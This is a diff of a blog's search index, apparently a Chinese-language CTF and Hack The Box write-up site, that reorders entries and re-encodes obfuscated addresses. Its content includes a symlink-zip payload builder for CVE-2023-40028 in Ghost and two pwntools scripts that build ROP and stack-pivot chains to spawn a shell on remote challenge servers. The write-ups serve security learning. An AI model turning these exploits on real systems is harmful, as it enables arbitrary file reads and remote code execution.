@@ -797,7 +797,7 @@
                       alt="image"
                 ></a></p>
 <p><a class="link"   href="https://medium.com/@mukhammadiyev20040/linkvortex-htb-write-up-5fbc66cc0081" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#x47;&#x68;&#x6f;&#x73;&#116;&#x40;&#53;&#46;&#x35;&#x39;&#x2e;&#x31;" >&#x47;&#x68;&#x6f;&#x73;&#116;&#x40;&#53;&#46;&#x35;&#x39;&#x2e;&#x31;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
+<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#x47;&#104;&#x6f;&#x73;&#x74;&#x40;&#53;&#46;&#x35;&#x39;&#46;&#49;" >&#x47;&#104;&#x6f;&#x73;&#x74;&#x40;&#53;&#46;&#x35;&#x39;&#46;&#49;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>genrate_exp</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">generate_exploit</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">local</span> FILE_TO_READ=<span class="variable">$1</span></span><br><span class="line">  IMAGE_NAME=$(<span class="built_in">tr</span> -dc A-Za-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 13; <span class="built_in">echo</span>)</span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/</span><br><span class="line">  <span class="built_in">ln</span> -s <span class="variable">$FILE_TO_READ</span> <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/<span class="variable">$IMAGE_NAME</span>.png</span><br><span class="line">  zip -r -y <span class="variable">$PAYLOAD_ZIP_NAME</span> <span class="variable">$PAYLOAD_PATH</span>/ &amp;&gt;/dev/null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <ul>
@@ -829,7 +829,7 @@
 
 <hr>
 <blockquote>
-<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#x73;&#116;&#x64;&#111;&#x75;&#x74;&#x40;&#x47;&#76;&#x49;&#x42;&#67;&#95;&#x32;&#x2e;&#50;&#46;&#53;" >&#x73;&#116;&#x64;&#111;&#x75;&#x74;&#x40;&#x47;&#76;&#x49;&#x42;&#67;&#95;&#x32;&#x2e;&#50;&#46;&#53;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
+<p>能用的gadget都沒有，我們可以使用 <code>deregister_tm_clones</code> 這個 function 有個神奇的東西 (如下圖)<br>這邊就會直接幫我們把rax設為0x404040（也就是<a class="link"   href="mailto:&#x73;&#116;&#x64;&#x6f;&#117;&#116;&#64;&#71;&#x4c;&#x49;&#x42;&#x43;&#x5f;&#x32;&#x2e;&#50;&#x2e;&#x35;" >&#x73;&#116;&#x64;&#x6f;&#117;&#116;&#64;&#71;&#x4c;&#x49;&#x42;&#x43;&#x5f;&#x32;&#x2e;&#50;&#x2e;&#x35;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 <code>mov rdi,rax</code> 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。</p>
 </blockquote>
 <p><img  
                      lazyload
@@ -1782,26 +1782,6 @@ Pwnable.tw</p>
       </tags>
   </entry>
   <entry>
-    <title>ROP3-WriteUp</title>
-    <url>/2024/08/09/pwn-6/</url>
-    <content><![CDATA[<h2 id="Ret2plt"><a href="#Ret2plt" class="headerlink" title="Ret2plt"></a>Ret2plt</h2><blockquote>
-<p>這題跟上題就差在這題是dynamic linking，所以我們需要leak libc位置後使用libc中的東西call shell。</p>
-</blockquote>
-<ul>
-<li>print的got塞入rdi後call print@plt這樣我們就知道print function在這次程式執行時是在alsr的哪個位置</li>
-<li>然後再用 <code>readelf -s</code> 找出並剪掉printf在libc中的offset，這樣我們就得到libc的base address</li>
-<li>再call回main overflow執行我們的rop chain就可以拿到shell了🥳</li>
-</ul>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span>,<span class="number">10103</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;rop3&quot;)</span></span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011f9</span></span><br><span class="line">print_got = <span class="number">0x404018</span></span><br><span class="line">plt_print = <span class="number">0x401060</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">name_buf = <span class="number">0x404060</span></span><br><span class="line">mainn= <span class="number">0x4011fe</span></span><br><span class="line">leave_ret = <span class="number">0x4011ef</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">p1 +=p64(ret)</span><br><span class="line">p1 += p64(pop_rdi)+p64(print_got)+p64(plt_print)</span><br><span class="line">p1 += p64(ret) + p64(mainn)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln:&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x606F0</span></span><br><span class="line">success (<span class="string">&#x27;libc -&gt; %s&#x27;</span> % <span class="built_in">hex</span>( l.address )) </span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>)),</span><br><span class="line">    ret,</span><br><span class="line">    l.sym.system</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/`whoami`/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-]]></content>
-      <categories>
-        <category>PWN</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Stack Pivoting WriteUp</title>
     <url>/2024/08/09/pwn-5/</url>
     <content><![CDATA[<h2 id="Stack-Pivoting"><a href="#Stack-Pivoting" class="headerlink" title="Stack Pivoting"></a>Stack Pivoting</h2><blockquote>
@@ -1818,6 +1798,26 @@ Pwnable.tw</p>
 
 <h2 id="ncku-ctf-pivoting"><a href="#ncku-ctf-pivoting" class="headerlink" title="ncku-ctf-pivoting"></a>ncku-ctf-pivoting</h2><p>這邊上下兩題幾乎一樣只有gadget需要重找</p>
 <div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.terminal = [&quot;tmux&quot;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&quot;./chal&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;chall.nckuctf.org&quot;</span>,<span class="number">10011</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401f1f</span></span><br><span class="line">pop_rax = <span class="number">0x44ff47</span></span><br><span class="line">pop_rsi = <span class="number">0x409f8e</span> </span><br><span class="line">pop_rdx_rbx = <span class="number">0x485ccb</span> </span><br><span class="line">syscall = <span class="number">0x401cd4</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x4c7220</span></span><br><span class="line">leave_ret = <span class="number">0x401877</span></span><br><span class="line"></span><br><span class="line">p = flat(</span><br><span class="line">    <span class="string">&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    name,</span><br><span class="line">    pop_rsi,</span><br><span class="line">    <span class="number">0x0</span>,</span><br><span class="line">    pop_rax,</span><br><span class="line">    <span class="number">0x3b</span>,</span><br><span class="line">    pop_rdx_rbx,</span><br><span class="line">    <span class="number">0x0</span>,<span class="number">0x0</span>,</span><br><span class="line">    syscall</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">pri = flat(</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>,</span><br><span class="line">    name,</span><br><span class="line">    leave_ret,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,pri)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/$(whoami)/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+]]></content>
+      <categories>
+        <category>PWN</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ROP3-WriteUp</title>
+    <url>/2024/08/09/pwn-6/</url>
+    <content><![CDATA[<h2 id="Ret2plt"><a href="#Ret2plt" class="headerlink" title="Ret2plt"></a>Ret2plt</h2><blockquote>
+<p>這題跟上題就差在這題是dynamic linking，所以我們需要leak libc位置後使用libc中的東西call shell。</p>
+</blockquote>
+<ul>
+<li>print的got塞入rdi後call print@plt這樣我們就知道print function在這次程式執行時是在alsr的哪個位置</li>
+<li>然後再用 <code>readelf -s</code> 找出並剪掉printf在libc中的offset，這樣我們就得到libc的base address</li>
+<li>再call回main overflow執行我們的rop chain就可以拿到shell了🥳</li>
+</ul>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=BytesWarning)</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">r = remote(<span class="string">&quot;35.229.243.81&quot;</span>,<span class="number">10103</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;rop3&quot;)</span></span><br><span class="line">l = ELF(<span class="string">&quot;../libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4011f9</span></span><br><span class="line">print_got = <span class="number">0x404018</span></span><br><span class="line">plt_print = <span class="number">0x401060</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line">name_buf = <span class="number">0x404060</span></span><br><span class="line">mainn= <span class="number">0x4011fe</span></span><br><span class="line">leave_ret = <span class="number">0x4011ef</span></span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">p1 +=p64(ret)</span><br><span class="line">p1 += p64(pop_rdi)+p64(print_got)+p64(plt_print)</span><br><span class="line">p1 += p64(ret) + p64(mainn)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln:&#x27;</span>,p1)</span><br><span class="line"></span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">l.address = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\0&quot;</span>)) - <span class="number">0x606F0</span></span><br><span class="line">success (<span class="string">&#x27;libc -&gt; %s&#x27;</span> % <span class="built_in">hex</span>( l.address )) </span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>,</span><br><span class="line">    pop_rdi,</span><br><span class="line">    <span class="built_in">next</span>(l.search(<span class="string">&#x27;/bin/sh\0&#x27;</span>)),</span><br><span class="line">    ret,</span><br><span class="line">    l.sym.system</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;name?&#x27;</span>,<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;vuln:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat /home/`whoami`/flag*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -2723,16 +2723,6 @@ Pwnable.tw</p>
       </tags>
   </entry>
   <entry>
-    <title>categories</title>
-    <url>/categories/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>tags</title>
-    <url>/tags/index.html</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>About</title>
     <url>/about/index.html</url>
     <content><![CDATA[<h1 align="center">
@@ -2809,5 +2799,15 @@ Pwnable.tw</p>
                       alt=""
                 >
 </div>]]></content>
+  </entry>
+  <entry>
+    <title>categories</title>
+    <url>/categories/index.html</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>tags</title>
+    <url>/tags/index.html</url>
+    <content><![CDATA[]]></content>
   </entry>
 </search>
